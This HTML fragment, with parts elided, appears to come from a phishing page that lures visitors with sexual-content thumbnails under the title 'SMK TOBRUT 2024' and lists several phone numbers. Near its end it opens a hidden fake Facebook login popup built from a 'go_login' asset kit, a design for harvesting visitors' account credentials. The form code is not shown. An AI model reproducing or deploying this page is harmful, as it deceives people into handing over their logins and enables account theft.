...
<html>
    <head>
        ...
        <link rel="icon" type="png/image" href="https://i.ibb.co/72CXgt1/IMG-6630.jpg" />
        ...
        <main>
            <header>
                <div class="kralxh">
                    ...
                    <img src="https://i.ibb.co/72CXgt1/IMG-6630.jpg" alt="" />
                    <div class="txtalxh">
                        <h1>SMK TOBRUT 2024</h1>
                        <p>+62 838-9201-5028, +62 821-1152-0801, +62 896-7222-4090, +62 853-2266-1189</p>
                    </div>
                </div>
                <div class="knalxh">
                ...
                <div class="sialxc" id="alxc1" style="display: none">
                    <div class="calxc">
                        ...
                        <div class="isalxcvn">
                            ...
                            <div class="knalxc">
                                <img src="https://i.ibb.co/Y01W8HN/Screenshot-484.png" alt="" />
                    ...
                    <div class="calxc" id="alxc2" style="display: none">
                        ...
                        <div class="isalxcvn">
                            <div class="valxc">
                                <img src="https://i.ibb.co/hCmrrJj/IMG-6772.jpg" alt="" />
                                <div class="balxcv">
                                    <div class="dlalxcv">
                    ...
                    <div class="calxc" id="alxc3" style="display: none">
                        ...
                        <div class="isalxcvn">
                            <div class="valxc">
                                <img src="https://i.ibb.co/gRDdQ9b/9429795792947.png" alt="" />
                                <div class="balxcv">
                                    <div class="dlalxcv">
                                        <i class="fa-solid fa-down"></i>
                                        <span>5,2 MB</span>
            ...
            <div class="jnalxc" style="display: none">
                ...
                <div class="bxalxjnc" style="display: none" id="jnalx">
                    ...
                    <div class="dscalxjnc">
                        <p><b>Selamat datang vokepers</b><br>
            ...
            <div class="popup-login login-facebook animated fadeIn" style="display: none;">
		      <div class="popup-box-login-fb">
		        <div class="navbar-fb">
		          <img width="45" src="https://cdn.jsdelivr.net/gh/gowebid/assets@main/go_login/facebook_white.png">
		          </div>
